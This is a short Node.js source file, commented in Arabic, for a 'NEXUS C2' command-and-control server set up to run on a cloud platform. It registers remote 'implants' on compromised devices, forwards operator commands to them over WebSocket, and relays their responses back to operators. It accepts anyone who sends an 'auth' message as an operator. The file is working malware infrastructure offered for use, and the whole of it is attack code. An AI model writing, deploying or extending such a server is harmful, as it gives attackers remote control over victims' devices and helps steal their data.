// 1. الجزء المعدل للمنصات السحابية
const WebSocket = require('ws');
const http = require('http');

// إنشاء سيرفر HTTP يتوافق مع Render
const server = http.createServer((req, res) => {
    res.writeHead(200);
    res.end("NEXUS C2 SERVER IS ONLINE");
});

const wss = new WebSocket.Server({ server });

// قاعدة البيانات المؤقتة (اتركها كما هي)
const implants = new Map();      
const operators = new Map();     

wss.on('connection', (ws, req) => {
    ws.isAlive = true;
    ws.on('pong', () => ws.isAlive = true);
    
    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);
            routeMessage(ws, msg); // استدعاء منطق التوجيه
        } catch(e) {
            console.log("Error parsing JSON");
        }
    });

    ws.on('close', () => {
        for(let [id, client] of implants) {
            if(client.ws === ws) {
                client.online = false;
                broadcastToOperators({type: 'heartbeat', targetId: id, status: 'offline'});
            }
        }
    });
});

// 2. منطق التوجيه (هذا هو قلب السيرفر - ابقِه كما هو)
function routeMessage(ws, msg) {
    switch(msg.type) {
        case 'implant_register':
            implants.set(msg.id, {ws: ws, model: msg.model, version: msg.version, online: true});
            broadcastToOperators({type: 'new_target', id: msg.id, model: msg.model});
            break;
            
        case 'command':
            const implant = implants.get(msg.target);
            if(implant && implant.online) {
                implant.ws.send(JSON.stringify(msg));
            }
            break;

        case 'implant_response':
            broadcastToOperators(msg);
            break;

        case 'auth':
            operators.set(ws, {auth: true});
            ws.send(JSON.stringify({type: 'auth_success'}));
            break;
    }
}

function broadcastToOperators(msg) {
    const data = JSON.stringify(msg);
    operators.forEach((info, ws) => {
        if(ws.readyState === WebSocket.OPEN) ws.send(data);
    });
}

// 3. تشغيل السيرفر على المنفذ المتغير
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`NEXUS C2 Active on Port: ${PORT}`);
});
